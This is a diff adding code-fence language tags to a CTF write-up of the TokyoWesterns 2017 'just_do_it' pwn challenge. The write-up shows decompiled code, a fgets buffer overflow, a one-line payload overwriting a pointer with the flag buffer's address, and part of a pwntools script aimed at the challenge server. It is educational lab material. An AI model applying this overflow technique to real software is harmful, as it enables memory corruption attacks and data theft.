@@ -4,12 +4,12 @@ This was originally a pwn challenge from the TokyoWesterns 2017 ctf.
 
 Let's take a look at the binary:
 
-```
+```bash
 $    file just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
 just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
 ```
 
-```
+```bash
 $    pwn checksec just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
 [*] '/Hackery/west/doit/just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa'
     Arch:     i386-32-little
@@ -21,7 +21,7 @@ $    pwn checksec just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9
 
 So we can see that it is a 32 bit binary, with a non executable stack. Let's try to run it.
 
-```
+```bash
 $    ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
 file open error.
 : No such file or directory
@@ -29,7 +29,7 @@ file open error.
 
 So it is complaining about a file opening error, probably trying to open a file that isn't there. Let's look at the main function in Ghidra:
 
-```
+```c
 undefined4 main(void)
 
 {
@@ -82,7 +82,7 @@ So we can see that the file it is trying to open is `flag.txt`. We can also see 
 
 So we can see that the string it is checking for is `P@SSW0RD`. Now since our input is being scanned in through an fgets call, a newline character `0x0a` will be appended to the end. So in order to pass the check we will need to put a null byte after `P@SSW0RD`.
 
-```
+```bash
 $    python -c 'print "P@SSW0RD" + "\x00"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
 Welcome my secret service. Do you know the password?
 Input the password.
@@ -91,7 +91,7 @@ Correct Password, Welcome!
 
 So we passed the check, however that doesn't solve the challenge. We can see that with the fgets call, we can input 32 bytes worth of data into `vulnBuf`. Let's see how many bytes `vulnBuf` can hold:
 
-```
+```asm
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
@@ -120,7 +120,7 @@ So we passed the check, however that doesn't solve the challenge. We can see tha
 
 So we can see that it can hold 16 bytes worth of data (0x28 - 0x18 = 16). So we effectively have a buffer overflow vulnerability with the fgets call to `vulnBuf`. However it appears that we can't reach the `eip` register to get RCE. However we can reach `target` which is printed with a puts call, right before the function returns. So we can print whatever we want. That makes this code look really helpful:
 
-```
+```c
   stream = fopen("flag.txt", "r");
   if ( !stream )
   {
@@ -136,7 +136,7 @@ So we can see that it can hold 16 bytes worth of data (0x28 - 0x18 = 16). So we 
 
 So we can see here that after it opens the `flag.txt` file, it scans in 48 bytes worth of data into `flag`. This is interesting because if we can find the address of `flag`, then we should be able to overwrite the value of `target` with that address and then it should print out the contents of `flag`, which should be the flag.
 
-```
+```asm
   .bss:0804A080 ; char flag[48]
 .bss:0804A080 flag            db 30h dup(?)           ; DATA XREF: main+95o
 .bss:0804A080 _bss            ends
@@ -145,7 +145,7 @@ So we can see here that after it opens the `flag.txt` file, it scans in 48 bytes
 
 So here we can see that `flag` lives in the bss, with the address `0x0804a080`. There are 20 bytes worth of data between `vulnBuf` and `target` (0x28 - 0x14 = 20). So we can form a payload with 20 null bytes, followed by the address of `flag`:
 
-```
+```bash
   python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
 Welcome my secret service. Do you know the password?
 Input the password.
@@ -154,7 +154,7 @@ flag{gottem_boyz}
 
 So we were able to read the contents of `flag.txt` with our exploit. Let's write an exploit to use the same exploit against the server they have with the challenge running to get the flag. Here is the python code:
 
-```
+```python
 #Import pwntools
 from pwn import *
 
@@ -176,7 +176,7 @@ target.interactive()
 
 Now let's run it:
 
-```
+```bash
 $    python exploit.py
 [+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 12482: Done
 Welcome my secret service. Do you know the password?
